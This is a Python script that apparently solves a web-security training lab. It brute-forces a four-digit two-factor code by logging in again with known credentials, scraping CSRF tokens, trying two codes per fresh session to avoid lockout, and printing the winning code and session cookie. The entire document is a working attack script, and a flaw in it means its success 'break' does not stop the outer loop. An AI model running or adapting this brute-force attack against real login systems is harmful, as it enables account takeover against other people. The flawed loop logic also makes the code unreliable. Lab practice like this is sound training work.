# Lab: 2FA bypass using a brute-force attack

import requests
from bs4 import BeautifulSoup

url = "https://0af3007804957b33817530f900cd00ee.web-security-academy.net"

username = "carlos"
password = "montoya"

i = 0

while i < 10000:

    # NEW SESSION
    session = requests.Session()

    # GET /login
    r = session.get(f"{url}/login")

    soup = BeautifulSoup(r.text, "html.parser")

    csrf = soup.find(
        "input",
        {"name": "csrf"}
    )["value"]

    print(f"\n[+] Login CSRF: {csrf}")

    # POST /login
    r = session.post(
        f"{url}/login",
        data={
            "csrf": csrf,
            "username": username,
            "password": password
        }
    )

    # GET /login2
    r = session.get(f"{url}/login2")

    soup = BeautifulSoup(r.text, "html.parser")

    csrf = soup.find(
        "input",
        {"name": "csrf"}
    )["value"]

    print(f"[+] MFA CSRF: {csrf}")

    # TRYING 2 CODES BEFORE SESSION EXPIRES
    for _ in range(2):

        code = str(i).zfill(4)

        # POST /login2
        r = session.post(
            f"{url}/login2",
            data={
                "csrf": csrf,
                "mfa-code": code
            },
            allow_redirects=False
        )

        print(f"Trying: {code}")

        # SUCCESS
        if r.status_code == 302:
            print(f"\n[+] SUCCESS: {code}")
            print(f"[+] SESSION: {session.cookies['session']}")
            break
        i += 1
